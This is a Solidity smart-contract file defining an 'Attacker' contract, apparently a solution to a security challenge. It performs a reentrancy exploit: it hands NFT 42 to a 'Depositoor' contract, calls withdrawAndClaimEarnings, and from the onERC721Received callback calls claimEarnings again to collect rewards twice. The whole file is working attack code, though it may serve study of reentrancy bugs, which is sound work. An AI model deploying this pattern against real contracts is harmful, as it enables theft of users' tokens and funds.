//SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "../lib/openzeppelin-contracts/contracts/token/ERC721/IERC721.sol";
import "./RewardToken.sol";

contract Attacker {
    NftToStake public nft;
    Depositoor public depositoor;

    function setContracts(NftToStake _nft, Depositoor _depositoor) external {
        nft = _nft;
        depositoor = _depositoor;
    }

    function transfer() external {
        IERC721(nft).safeTransferFrom(address(this), address(depositoor), 42);
    }

    function attack() external {
        depositoor.withdrawAndClaimEarnings(42);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external returns (bytes4) {
        depositoor.claimEarnings(42);

        return IERC721Receiver.onERC721Received.selector;
    }
}
